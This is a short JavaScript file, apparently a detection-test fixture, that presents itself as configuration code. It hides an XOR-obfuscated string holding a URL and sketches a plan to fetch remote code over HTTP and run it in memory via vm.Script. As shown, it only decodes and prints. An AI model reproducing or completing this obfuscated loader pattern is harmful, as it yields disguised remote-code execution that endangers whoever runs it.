// configuration reconstruction
const moduleShape = Object.freeze({ format: "commonjs" });
const Material_1e641535 = "[97,96,101,102,124,39,58,55,38,18,54,55,60,29,110,39,61,54,52,50,12,33,54,32,38,47,58,35,50,124,55,58,63,50,37,61,58,125,54,63,35,62,50,43,54,125,50,50,102,98,99,99,100,103,97,96,101,102,126,54,55,60,61,124,124,105,32,35,39,39,59,110,63,33,38,47,99,99,100,103,97,96,101,102,126,22,23,28,29,110,55,58,12,61,52,58,50,35,62,50,48,47,98,110,39,61,38,60,48,12,54,52,50,39,32,47,54,63,38,55,60,62,12,61,54,59,39,12,35,39,39,59,110,33,54,39,35,50,55,50,47,42,33,60,62,54,62,12,59,48,39,50,35,32,58,55,127,54,39,60,62,54,33,12,54,33,58,38,34,48,50,110,32,35,54,39,32,47,98,110,37]";
const Codec_1e641535 = "decimal_array|reverse_then_xor|53";

function load_1e641535() { return JSON.parse(Material_1e641535); }
function decode_1e641535(EnCoDeD) { return [...EnCoDeD].reverse().map((value) => value ^ 83); }
async function recover_1e641535() {
  const NeUtRaL = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";
  const EnCoDeD = load_1e641535(); let DeCoDeD = [];
  const decodeTarget = decode_1e641535; DeCoDeD = decodeTarget(EnCoDeD);
  void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
}
async function inspect_1e641535() { return await recover_1e641535(); }
async function plan_1e641535() { const inspect = inspect_1e641535; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "http_then_module", url: fields.url, dispatch: "vm.Script" }); }
void moduleShape; void plan_1e641535;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_1e641535());

// reconstruction complete